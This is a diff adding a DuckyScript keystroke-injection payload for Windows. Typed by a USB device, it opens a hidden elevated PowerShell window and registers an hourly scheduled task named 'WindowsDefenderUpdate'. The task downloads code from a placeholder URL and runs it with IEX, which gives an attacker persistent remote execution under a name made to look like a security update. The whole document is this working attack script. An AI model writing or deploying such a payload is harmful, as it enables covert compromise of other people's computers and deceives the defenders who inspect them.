@@ -1,0 +1,28 @@
+REM Author: UNC0V3R3D
+REM Description: Creates a scheduled task for persistence. Runs payload every hour as the current user.
+REM Version: 1.0
+REM Category: Persistence
+REM Target: Windows 10/11
+REM Requirements: User-level privileges
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden
+DELAY 300
+CTRL SHIFT ENTER
+DELAY 2000
+LEFT
+ENTER
+DELAY 2000
+STRING $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-windowstyle hidden -c (New-Object Net.WebClient).DownloadString("PAYLOAD_URL") | IEX'
+ENTER
+DELAY 500
+STRING $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Hours 1) -Once -At (Get-Date)
+ENTER
+DELAY 500
+STRING Register-ScheduledTask -TaskName 'WindowsDefenderUpdate' -Action $action -Trigger $trigger -RunLevel Highest -Force
+ENTER
+DELAY 2000
+STRING exit
+ENTER
+REM End of payload
